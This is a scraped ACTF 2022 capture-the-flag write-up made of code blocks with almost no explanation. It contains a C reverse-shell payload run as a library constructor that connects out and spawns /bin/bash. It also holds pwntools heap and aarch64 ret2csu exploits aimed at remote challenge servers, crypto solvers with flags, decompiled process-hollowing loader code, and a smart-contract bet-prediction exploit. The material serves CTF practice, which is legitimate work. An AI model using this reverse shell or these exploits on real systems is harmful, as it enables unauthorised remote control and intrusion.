@@ -1,0 +1,112 @@
+# ACTF-WriteUp
+
+> 原文: https://www.ctfiot.com/46538.html
+> ID: 46538
+
+end
+
+招新小广告
+
+ChaMd5 Venom 招收大佬入圈
+
+新成立组IOT+工控+样本分析 长期招新
+
+欢迎联系admin@chamd5.org
+
+
+```
+#include<stdio.h>#include<stdlib.h>#include<sys/socket.h>#include<netinet/in.h>char *server_ip="";uint32_t server_port=7777;static void reverse_shell(void) __attribute__((constructor));static void reverse_shell(void) {  int sock = socket(AF_INET, SOCK_STREAM, 0);  struct sockaddr_in attacker_addr = {0};  attacker_addr.sin_family = AF_INET;  attacker_addr.sin_port = htons(server_port);  attacker_addr.sin_addr.s_addr = inet_addr(server_ip);  if(connect(sock, (struct sockaddr *)&attacker_addr,sizeof(attacker_addr))!=0)    exit(0);  dup2(sock, 0);  dup2(sock, 1);  dup2(sock, 2);  execve("/bin/bash", 0, 0);}
+```
+
+
+
+```
+a = [240,188,218,205,188,154,138,200,207,33,26,246,30,136,124,38,241,178,193,127,163,161,72,140,187,16,19]b= [177, 255, 142, 139, 199, 227, 202, 163, 186, 76, 91, 152, 65, 185, 15, 121, 152, 220, 162, 13, 198, 197, 36, 191, 215, 117, 110]for i in range(27):    print(chr(a[i]^b[i]),end='')
+```
+
+
+
+```
+import osfor i in range(10000):    t=os.system('zstd --decompress flag -o flag.bak && mv flag.bak flag')    if t!=0:        r=os.system('mv f* flag.bz2 && bunzip2 flag.bz2')        if r!=0:            breakprint(i)#ACTF{r0cK_4Nd_rolL_1n_C0mpr33s1ng_aNd_uNCOmrEs5iNg}
+```
+
+
+
+```
+from Crypto.PublicKey import RSAfrom decimal import Decimalimport gmpy2import sympyf=open('./public.pem','rb')key =RSA.importKey(f.read())e=key.key.en=key.key.na,b,c=(e,-1,-2*n)for m in range(e):    c=-m*n    t=b*b-4*a*c    g=gmpy2.iroot(b*b-4*a*c,2)    if g[1]:        print(m,g)m=46280sympy.solve(f'{m}*x**2 + x - {e*n}')p=150465840847587996081934790667651610347742504431401795762471467800785876172317705268993152743689967775266712089661128372295606682852482012493939368044600366794969553828079064622047080051569090177885299781981209120854290564064662058027679075401901717932024549311396484660557278975525859127898004619405319768113q=n//pphi=(p-1)*(q-1)from Crypto.Util.number import *d=inverse(e,phi)f=open('./flag','rb')flag=f.read()flag_1=bytes_to_long(flag)long_to_bytes(pow(flag_1,d,n))#ACTF{F1nD1nG_5pEcia1_n_i5_nOt_eA5y}
+```
+
+
+
+```
+# -*- coding: utf-8 -*-from pwn import *import osp=process('./1')p=remote('121.36.241.104',9999)#p=process(['./1'],env={'LD_PRELOAD':'./libc-2.27_64.so'})libc=ELF('/glibc-all-in-one//libs/2.27-3ubuntu1.6_amd64/libc-2.27.so')context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])context.log_level='debug'def debug():    gdb.attach(p)    pause()def lg(name,val):    log.success(name+' : '+hex(val))def menu(i):    p.recvuntil('Your choice > ')    p.sendline(str(i))def add(x,y,name):    menu(0)    p.recvuntil(': ')    p.sendline(str(x))    p.recvuntil(': ')    p.sendline(str(y))    p.recvuntil(': ')    p.send(name)def delete(x,y):    menu(1)    p.recvuntil(': ')    p.sendline(str(x))    p.recvuntil(': ')    p.sendline(str(y))def edit(x,y,name):    menu(2)    p.recvuntil(': ')    p.sendline(str(x))    p.recvuntil(': ')    p.sendline(str(y))    p.recvuntil(': ')    p.send(name)def show(x,y):    menu(3)    p.recvuntil(': ')    p.sendline(str(x))    p.recvuntil(': ')    p.sendline(str(y))def q(x1,y1,x2,y2):    menu(4)    p.recvuntil(': ')    p.sendline(str(x1))    p.recvuntil(': ')    p.sendline(str(y1))    p.recvuntil(': ')    p.sendline(str(x2))    p.recvuntil(': ')    p.sendline(str(y2))p.recvuntil('`')cmd=p.recvuntil('`',drop=True)hash=os.popen(cmd).read()print hashp.sendline(hash)for i in range(0x10):    add(i,i,32*chr(i))delete(1,1)delete(3,3)delete(5,5)delete(4,4)show(4,4)p.recvuntil(' name: ')heap_addr=u64(p.recv(6).ljust(8,'x00'))-0x3c0edit(4,4,p64(heap_addr+0x260)*4)add(0x10,0x10,p64(0x0000000200000003)+p64(0)+p64(heap_addr+0x390)+p64(heap_addr+0x398))add(1,1,p64(1)+p64(2)+p64(heap_addr+0x390)+p64(0x51))edit(0x0,0x0,p64(0)+p64(0x390+heap_addr)+p64(heap_addr+0x2c0)+p64(0x0000000500050000))edit(0,0,p64(0)+p64(0x581)*3)edit(5,5,p64(0x0000000200000003)+p64(0)+p64(heap_addr+0x390)+p64(heap_addr+0x2d0))delete(0,0)edit(5,5,p64(0x0000000200000003)+p64(0)+p64(heap_addr+0x390)+p64(heap_addr+0x2d0))show(0,0)libc.address=u64(p.recvuntil('x7f')[-6:].ljust(8,'x00'))-96-0x10-libc.sym['__malloc_hook']lg('libc',libc.address)edit(5,5,p64(0x0000000200000003)+p64(0)+p64(heap_addr+0x390)+p64(libc.sym['__free_hook']-8))edit(0,0,'/bin/shx00'+p64(libc.sym['system'])*3)delete(0,0)p.interactive()
+```
+
+
+
+```
+#AIM: PLAYER_AI GETS THE NEXT MOVE FOR THE PLAYERfrom BaseAI_3 import BaseAIfrom Helper import *from Minimaxab import *from Grid_3 import *import numpy as npfrom pwn import *p=process(['qemu-aarch64','-L','/usr/aarch64-linux-gnu/','./1'])context(arch='aarch64', os='linux', terminal=['tmux', 'splitw', '-h'])#context.log_level='debug'#class PlayerAI(BaseAI):def getMove(grid):    moves = grid.getAvailableMoves()    maxUtility = -np.inf    nextDir = -1    for move in moves:        child = getChild(grid, move)        utility = Decision(grid=child, max=False)        if utility >= maxUtility:            maxUtility = utility            nextDir = move    return nextDirdef show():    for i in range(4):        for j in range(4):            print("%6d  " % grid.map[i][j], end="")        print("")    print(0x18*'=')grid = Grid()'''    0: "UP",    1: "DOWN",    2: "LEFT",    3: "RIGHT"'''idx=0cmd=''p.recvuntil('name:')p.sendline('a')#p.interactive()idx=0while True:    p.recvuntil('Score')    for j in range(4):        p.recvuntil('+------+------+------+------+n')        print(p.recvline())        #print(p.recvline())        for k in range(4):            p.recvuntil(b'|')            if p.recv(1)!=b'x20':                p.recvuntil('m')                p.recvuntil('m')                q=p.recvuntil(b' x1b',drop=True)                while True:                    if q[0]==b'x20':                        q=q[1:]                    else:                        break                #print(p.recvline())                #p.interactive()                                #pause()                num=int(q)                if num==2048:                    break                grid.map[j][k]=num            else:                grid.map[j][k]=0        a=getMove(grid)    if a==0:        p.sendline('w')        cmd+='w'    elif a==1:        p.sendline('s')        cmd+='s'    elif a==2:        p.sendline('a')        cmd+='a'    else:        p.sendline('d')        cmd+='d'    print(cmd)    show()'''sddsdsdsddssssdddsddssddddwsdsdsddssdsdsssdsddddddsssddsddddadssdsdsddddssdddddadsssswssddsdsdssddadddsdddadsdssddsdddswwwdddsddadsdddaasdsddsdsdsddsdsddsdddssdsddsddddwsdsssddsadsdsdddsddsaddwwdsddsssddsdadadsdssasdadswsdaddssssswswdssddssdsdsadwdswwwswdsdsadassddsddddadaddssdasdsdsddsddsssdsdsddddsddddwssdssdswsdssdadadssswddadawwwwwdsdaasdsadsssdsddsdssdddswwwsddssasdwwwswswdddddsdssddddddsdswswswsdsadaasdddaaddsdassdsdasasddwwdddwdsdsddsddwddsadasdssdsswdsdsassddswwdwwswdadddassdsdsddwsddsadsssddsddsddaswasdsdssaddswsswsadsssssassdsdwwsssdsdsdddddsswwdwswsddssddsssssddsdssswssddswsddssddsddsssdswssssssddwddsdwsdswswsddwsdsssdasddadasddadsadsddddswdsasssswswsddsssssdsdwswdswswdsdsswsdsddsssadssdswsaaadsddssdswsswswddsddsdsssdadasdaassdwsdasdaadsdsddsddsadsdssssssddsdadsdsdsaddddsswdasasdddsddsadsdddsddsssdadadsaaddddssdwdddsadwdasddssddsssdsdsdddssaaaaasdsaddddswwdsdasswdwwswdsswsdsdddssswwsddssdwdssdsssssssdadsdadwdssdadddwddsddssdadddddddaadasddsddwdsdadaaaaaaadswds'''print(cmd)
+```
+
+
+
+```
+# -*- coding: utf-8 -*-from pwn import *#p=process(['qemu-aarch64','-L','/usr/aarch64-linux-gnu/','-g','1234','./1'])#p=process(['qemu-aarch64','-L','/usr/aarch64-linux-gnu/','./1'])p=remote('124.70.166.38',9999)elf=ELF('./1')#p=process(['./1'],env={'LD_PRELOAD':'./libc-2.27_64.so'})#libc=ELF('/glibc/2.23/64/lib/libc-2.23.so')context(arch='aarch64', os='linux', terminal=['tmux', 'splitw', '-h'])#context.log_level='debug'def debug():    gdb.attach(p)    pause()def lg(name,val):    log.success(name+' : '+hex(val))csu1_addr=0x4020D8csu2_addr=0x4020B8p.recvuntil('`')cmd=p.recvuntil('`',drop=True)hash=os.popen(cmd).read()print hashp.sendline(hash)libc=ELF('libc-2.31.so')libc.address=0x4000835000csu1_addr=0x04020D8csu2_addr=0x04020B8def ret2csu(func_addr, arg0, arg1, arg2):    payload = p64(csu1_addr)    payload += p64(0x04020D8) #x29    payload += p64(csu2_addr) #30    payload += p64(0)  # x19    payload += p64(1)  # x20    payload += p64(func_addr)  # x21    payload += p64(arg0)  # x22 (x0)    payload += p64(arg1)  # x23 (x1)    payload += p64(arg2)  # x24 (x2)    return payloadp.recvuntil('name:')p.send(p64(libc.sym['system'])+'cat flag')sleep(1)#p.interactive()p.send('sddsdsdsddssssdddsddssddddwsdsdsddssdsdsssdsddddddsssddsddddadssdsdsddddssdddddadsssswssddsdsdssddadddsdddadsdssddsdddswwwdddsddadsdddaasdsddsdsdsddsdsddsdddssdsddsddddwsdsssddsadsdsdddsddsaddwwdsddsssddsdadadsdssasdadswsdaddssssswswdssddssdsdsadwdswwwswdsdsadassddsddddadaddssdasdsdsddsddsssdsdsddddsddddwssdssdswsdssdadadssswddadawwwwwdsdaasdsadsssdsddsdssdddswwwsddssasdwwwswswdddddsdssddddddsdswswswsdsadaasdddaaddsdassdsdasasddwwdddwdsdsddsddwddsadasdssdsswdsdsassddswwdwwswdadddassdsdsddwsddsadsssddsddsddaswasdsdssaddswsswsadsssssassdsdwwsssdsdsdddddsswwdwswsddssddsssssddsdssswssddswsddssddsddsssdswssssssddwddsdwsdswswsddwsdsssdasddadasddadsadsddddswdsasssswswsddsssssdsdwswdswswdsdsswsdsddsssadssdswsaaadsddssdswsswswddsddsdsssdadasdaassdwsdasdaadsdsddsddsadsdssssssddsdadsdsdsaddddsswdasasdddsddsadsdddsddsssdadadsaaddddssdwdddsadwdasddssddsssdsdsdddssaaaaasdsaddddswwdsdasswdwwswdsswsdsdddssswwsddssdwdssdsssssssdadsdadwdssdadddwddsddssdadddddddaadasddsddwdsdadaaaaaaadswds')p.recvuntil('[y/n]: ')payload=40*'a'payload+=ret2csu(0x413154,0x413154+8,0,0)#payload+=ret2csu(0x413150,libc.search('/bin/sh').next(),0,0,0)print hex(libc.address)p.send(payload)p.recvuntil('Bye~n')#addr=u64(p.recv(4).ljust(8,'x00'))#print hex(addr)p.interactive()
+```
+
+
+
+```
+FARPROC sub_140018860(){  //..  sub_140011816((__int64)&unk_140035100);  v24 = (const CHAR *)decrypt_string(&unk_14002A000, 13i64);  kernel32_dll = LoadLibraryA(v24);  v1 = (const CHAR *)decrypt_string(&unk_14002A278, 13i64);  ResumeThread = (__int64)GetProcAddress(kernel32_dll, v1);  v2 = (const CHAR *)decrypt_string(&unk_14002A2B0, 19i64);  GetModuleFileNameW = (__int64)GetProcAddress(kernel32_dll, v2);  v3 = (const CHAR *)decrypt_string(&unk_14002A300, 17i64);  GetThreadContext = (__int64)GetProcAddress(kernel32_dll, v3);  v4 = (const CHAR *)decrypt_string(&unk_14002A350, 17i64);  SetThreadContext = (__int64)GetProcAddress(kernel32_dll, v4);  v5 = (const CHAR *)decrypt_string(&unk_14002A3A0, 18i64);  ReadProcessMemory = (__int64)GetProcAddress(kernel32_dll, v5);  v6 = (const CHAR *)decrypt_string(&unk_14002A3F0, 19i64);  WriteProcessMemory = (__int64)GetProcAddress(kernel32_dll, v6);  v7 = (const CHAR *)decrypt_string(&unk_14002A440, 13i64);  VirtualAlloc = (__int64)GetProcAddress(kernel32_dll, v7);  v8 = (const CHAR *)decrypt_string(&unk_14002A478, 15i64);  VirtualAllocEx = (__int64)GetProcAddress(kernel32_dll, v8);  v9 = (const CHAR *)decrypt_string(&unk_14002A070, 14i64);  FindResourceW = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))GetProcAddress(kernel32_dll, v9);  v10 = (const CHAR *)decrypt_string(&unk_14002A0A8, 13i64);  LoadResource = (__int64 (__fastcall *)(_QWORD, _QWORD))GetProcAddress(kernel32_dll, v10);  v11 = (const CHAR *)decrypt_string(&unk_14002A0E0, 13i64);  LockResource = (__int64 (__fastcall *)(_QWORD))GetProcAddress(kernel32_dll, v11);  v12 = (const CHAR *)decrypt_string(&unk_14002A118, 15i64);  SizeofResource = (__int64 (__fastcall *)(_QWORD, _QWORD))GetProcAddress(kernel32_dll, v12);  v13 = (const CHAR *)decrypt_string(&unk_14002A158, 15i64);  GetProcessW = (__int64)GetProcAddress(kernel32_dll, v13);  v14 = (const CHAR *)decrypt_string(&unk_14002A4C0, 17i64);  TerminateProcess_0 = (__int64)GetProcAddress(kernel32_dll, v14);  v15 = (const CHAR *)decrypt_string(&unk_14002A038, 13i64);  msvcr100_dll = LoadLibraryA(v15);  v16 = (const CHAR *)decrypt_string(&unk_14002A198, 7i64);  malloc_0 = (__int64)GetProcAddress(msvcr100_dll, v16);  v17 = (const CHAR *)decrypt_string(&unk_14002A1B8, 6i64);  srand = (__int64)GetProcAddress(msvcr100_dll, v17);  v18 = (const CHAR *)decrypt_string(&unk_14002A1D0, 8i64);  time64 = (__int64)GetProcAddress(msvcr100_dll, v18);  v19 = (const CHAR *)decrypt_string(&unk_14002A1F0, 5i64);  rand = (__int64)GetProcAddress(msvcr100_dll, v19);  v20 = (const CHAR *)decrypt_string(&unk_14002A208, 6i64);  fopen = (__int64)GetProcAddress(msvcr100_dll, v20);  v21 = (const CHAR *)decrypt_string(&unk_14002A220, 8i64);  fprintf = (__int64)GetProcAddress(msvcr100_dll, v21);  v22 = (const CHAR *)decrypt_string(&unk_14002A240, 7i64);  fclose = (__int64)GetProcAddress(msvcr100_dll, v22);  v23 = (const CHAR *)decrypt_string(&unk_14002A260, 5i64);  result = GetProcAddress(msvcr100_dll, v23);  free_0 = (__int64)result;  return result;}
+```
+
+
+
+```
+sub_7FF7B6C61816((__int64)&unk_7FF7B6C85100);  init_dll_funcs();  ModuleHandleW = GetModuleHandleW(0i64);  ResourceW = FindResourceW(ModuleHandleW, 101i64, 256i64);  Resource = LoadResource(ModuleHandleW, ResourceW);  resoruce[0] = LockResource(Resource);  sizeof_resource = SizeofResource(ModuleHandleW, ResourceW);  resoruce[0] = decrypt_resource(resoruce[0], sizeof_resource);  ExitCode[0] = 0;  j_memset(hHandle, 0, 0x18ui64);  j_memset(v15, 0, 0x68ui64);  LOWORD(v16[0]) = 0;  if ( !(unsigned int)sub_7FF7B6C615C3(hHandle, (__int64)v15, resoruce[0], v16, 2ui64) )
+```
+
+
+
+```
+sub_7FF7B6C61816((__int64)&unk_7FF7B6C85100);  if ( (unsigned int)GetModuleFileNameW(0i64, String, 520i64) )  {    j_memset(v13, 0, 0x1208ui64);    v14 = wcslen(String);    j_memcpy(v13, String, 2 * v14);    v13[v14] = 32;    j_memcpy(&v13[v14 + 1], a4, Size);    v15 = resource;    v16 = *(int *)(resource + 60) + resource;    if ( (unsigned int)GetProcessW(0i64, v13, 0i64, 0i64, 1, 4, 0i64, 0i64, a2, a1) )    {      j_memset(v17, 0, 0x4D0ui64);      LODWORD(v17[6]) = 1048587;      if ( (unsigned int)GetThreadContext(a1[1], v17) )      {        v18[0] = VirtualAllocEx(*a1, *(_QWORD *)(v16 + 48), *(unsigned int *)(v16 + 80), 12288i64, 64);        if ( v18[0] )        {          if ( (unsigned int)WriteProcessMemory(*a1, v18[0], resource, *(unsigned int *)(v16 + 84), 0i64) )          {            for ( j = 0i64; j < *(unsigned __int16 *)(v16 + 6); ++j )            {              v20 = (unsigned int *)(*(int *)(v15 + 60) + resource + 40 * j + 264);              if ( !(unsigned int)WriteProcessMemory(*a1, v20[3] + v18[0], v20[5] + resource, v20[4], 0i64) )              {                TerminateProcess_0(*a1, 4294967289i64);                v7 = 4294967289i64;                goto LABEL_26;              }            }            if ( (unsigned int)WriteProcessMemory(*a1, v17[17] + 16, v18, 8i64, 0i64) )            {              v17[16] = *(unsigned int *)(v16 + 40) + v18[0];              if ( (unsigned int)SetThreadContext(a1[1], v17) )              {                if ( (unsigned int)ResumeThread(a1[1]) )
+```
+
+
+
+```
+sub_7FF714B617EE(byte_7FF714B860F2);  tmp = (BigI *)decrypt_string((__int64)v20, (__int64)&unk_7FF714B7E168, 5);  v35 = (__int64 *)tmp;  output(std::cout, (__int64)tmp);  maybe_free(v20);  sub_7FF714B617DF((__int64)input);  read_str(std::cin, (__int64)input);  tmp = (BigI *)j_strLen((__int64)input);  input2 = get_cstr((__int64)input);  input_b64 = b64_encode(input2, (unsigned int)tmp);  merge((__int64)input, input_b64);  v22 = v21;  tmp = (BigI *)strcpy(v21, (const char *)input);  str2bigI((char *)&Source, (__int64 *)tmp->nums);  v24 = malloc_0(0x7E0ui64);
+```
+
+
+
+```
+char *__fastcall sub_7FF714B6BC50(char *a1, __int64 *a2){  //...  for ( v11[0] = 0; ; ++v11[0] )  {    v17 = v11[0];    v4 = j_strLen((__int64)a2);    if ( v17 >= v4 )      break;    int2bigI((__int64)&v12, 128i64); // 这里是128    j_bigIpow((__int64)&v12, (__int64)&v13, (__int64)v11);    CharAt = (char *)strGetCharAt((__int64)a2, v11[0]);    int2bigI((__int64)&v14, (unsigned int)*CharAt);    j_bigImul(&v14, &v15, &v13);    v6 = (int *)j_bigIadd((__int64)Source, (__int64)v16, (__int64)&v15);    j_bigIcopy(Source, v6);  }  j_intcpy(a1, Source);  return a1;}
+```
+
+
+
+```
+// (**v17)(v17, (__int64 *)tmp->nums);__int64 __fastcall encrypt(__int64 key, BigI *input){  //...  j_intcpy((char *)Destination, (const char *)input);  v14 = (int *)j_bigIadd((__int64)Destination, (__int64)v48, (__int64)v27);  j_bigIcopy(Destination, v14);  v15 = (int *)j_bigImul((BigI *)Destination, (BigI *)v49, (BigI *)v28);  j_bigIcopy(Destination, v15);  v16 = (int *)j_bigIsubabs((__int64)Destination, (__int64)v50, (__int64)v29);  j_bigIcopy(Destination, v16);  v17 = (int *)j_bigIadd((__int64)Destination, (__int64)v51, (__int64)v30);  j_bigIcopy(Destination, v17);  v18 = (int *)j_bigImul((BigI *)Destination, (BigI *)v52, (BigI *)v31);  j_bigIcopy(Destination, v18);  v19 = (int *)j_bigIsubabs((__int64)Destination, (__int64)v53, (__int64)v32);  j_bigIcopy(Destination, v19);  v20 = (int *)j_bigIadd((__int64)Destination, (__int64)v54, (__int64)v33);  j_bigIcopy(Destination, v20);  v21 = (int *)j_bigIsubabs((__int64)Destination, (__int64)v55, (__int64)v34);  j_bigIcopy(Destination, v21);  v22 = (int *)j_bigIadd((__int64)Destination, (__int64)v56, (__int64)v35);  j_bigIcopy(Destination, v22);  v23 = (int *)j_bigIsubabs((__int64)Destination, (__int64)v57, (__int64)v36);  j_bigIcopy(Destination, v23);  j_bigIcopy(input, Destination);  return check_overflow((__int64)v25, (__int64)&unk_7FF714B78F30);}
+```
+
+
+
+```
+def b2bigI(a):    s=0    p=1    for i in a:        s+=i*p        p*=128    return sdef bigI2I(a):    s=0    p=1    for i in a:        s+=p*i        p*=10000    return sdef i2str(a):    s=[]    p=1    while a>=128:        s.append(a%128)        a//=128    s.append(a)    return bytes(s)targ=[8433, 7593, 342, 2871, 1984, 1642, 9440, 3394, 8311, 2028, 7079, 8305, 248, 657, 986, 5500, 7924, 9497, 3109, 8290, 8787, 1600, 2271, 7732, 8512, 3986, 923, 4719, 9219, 3685, 496, 6248, 365, 1718, 8724, 5635, 6437, 5806, 4816, 6193, 396, 3063, 3735, 206, 1564, 912, 6633, 8869, 5633, 6686, 5073, 3516, 4477, 8799, 8818, 123, 9190, 1695, 723, 7151, 998, 6100, 8836, 952, 593, 5702, 374, 2078, 9411, 7813, 4247, 4708, 2612, 6715, 4071, 9894, 8003, 6194, 8622, 572, 1218, 9605, 6119, 5597, 9744, 7046, 3370, 1814, 7205, 8345, ]# print(hex(targ[0]))t=bigI2I(targ)v27=bigI2I([9388, 278, 1268, 2916, 7619, 6986, 434, 8142, 3713, 9643, 347, 9517, 684, 3959, 8949, 6627, 7251, 2918, 4540, 6458])v28=bigI2I([3526, 2132, 5621, 9575, 2298, 3616, 2055, 4103, 6348, 7812, 7953, 5076, 1898, 5217, 2831, 8048, 6973, 4104, 3410, 1178])v29=bigI2I([6793, 3650, 250, 4109, 5341, 7164, 9947, 6850, 7328, 1517, 2100, 5823, 1796, 8109, 9725, 4418, 7918, 7776, 851, 5544])v30=bigI2I([3607, 1798, 3103, 361, 8776, 2045, 5992, 8020, 5492, 9304, 884, 7531, 2328, 3791, 8477, 7574, 7147, 5891, 7047, 1786])v31=bigI2I([2787, 1695, 495, 7189, 4984, 8401, 8477, 8821, 1524, 9333, 3347, 2287, 3600, 1748, 8538, 1238, 8239, 7065, 7302, 753])v32=bigI2I([1664, 212, 1655, 7713, 8717, 2355, 2419, 6471, 3425, 9343, 7457, 8098, 5638, 1968, 6185, 5824, 9929, 9356, 3226, 8079])v33=bigI2I([9599, 857, 6193, 8631, 2984, 4037, 2980, 9442, 4673, 3411, 3202, 4672, 8769, 4438, 4458, 1523, 8917, 2266, 5283, 1438])v34=bigI2I([5749, 2729, 3467, 3377, 5922, 1736, 5403, 6104, 8175, 5668, 8967, 3257, 1340, 560, 7850, 8145, 4013, 7728, 9029, 5507])v35=bigI2I([465, 1390, 2723, 8764, 2468, 1737, 274, 6519, 9490, 2912, 2074, 3846, 4905, 4522, 9220, 3671, 286, 4572, 9332, 7111])v36=bigI2I([8894, 7959, 1416, 7040, 5241, 5871, 2250, 3438, 5007, 4180, 8698, 258, 5030, 405, 721, 9620, 4969, 9524, 5573, 5770])t=t+v36t=t-v35t=t+v34t=t-v33t=t+v32t=t//v31t=t-v30t=t+v29t=t//v28t=t-v27print(i2str(t))
+```
+
+
+
+```
+from Crypto.Util.number import *from web3 import Web3,HTTPProviderfrom eth_abi.packed import encode_abi_packedfrom eth_abi import encode_abiimport timedef deploy(rawTx):    signedTx = web3.eth.account.signTransaction(rawTx, private_key=acct.privateKey)    hashTx = web3.eth.sendRawTransaction(signedTx.rawTransaction).hex()    receipt = web3.eth.waitForTransactionReceipt(hashTx)    return receiptdef int2bytes32(a):    return long_to_bytes(a).rjust(32,b'x00')web3=Web3(HTTPProvider("http://123.60.36.208:8545"))acct= web3.eth.account.from_key('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')target="0x21ac0df70A628cdB042Dde6f4Eb6Cf49bDE00Ff7"airdrop = {    'from': acct.address,    'to': target,    'nonce': web3.eth.getTransactionCount(acct.address),    'gasPrice': web3.toWei(1, 'gwei'),    'gas': 555555,    'value': web3.toWei(0, 'ether'),    'data': "0x3884d635",    "chainId": 6666}print("airdrop")info=deploy(airdrop)if info['status']==1:    print("airdrop done")else:    print("sth error")    FLAG=Trueoffset=0for i in range(0,20):    print(i)    nonce=bytes_to_long(web3.eth.getStorageAt(target,2))    diffcult=2    now_block=web3.eth.block_number    start_block=1485    start_time=1656158960    pre_time=(now_block-start_block)*30+start_time+offset       #always 1230 due to init value    guess_num=bytes_to_long(Web3.keccak(encode_abi_packed(['uint256','uint','uint','address'],[nonce,pre_time,diffcult,acct.address])))%12    data_bet='0x6ffcc719'+hex(guess_num)[2:].rjust(64,'0')+'000000000000000000000000000000000000000000000000000000000000000c'    bet = {        'from': acct.address,        'nonce': web3.eth.getTransactionCount(acct.address),        'to': target,        'gasPrice': web3.toWei(1, 'gwei'),        'gas': 555555,        'value': web3.toWei(0, 'ether'),        'data': data_bet,        "chainId": 6666    }    info=deploy(bet)    if info['status']==1:        print("bet done",i)    else:        print("sth error")            nowtime=bytes_to_long(web3.eth.getStorageAt(target,4))    if FLAG:        offset = nowtime-pre_time        FLAG = False    print(web3.eth.block_number,pre_time,nowtime,nowtime-pre_time)    time.sleep(30)
+```
+
+
+---
+## 附图
+
+![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/06/3-1656461238.png)
+![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/06/8-1656461239.png)
+![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/06/0-1656461244.png)
+![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/06/7-1656461245.jpeg)
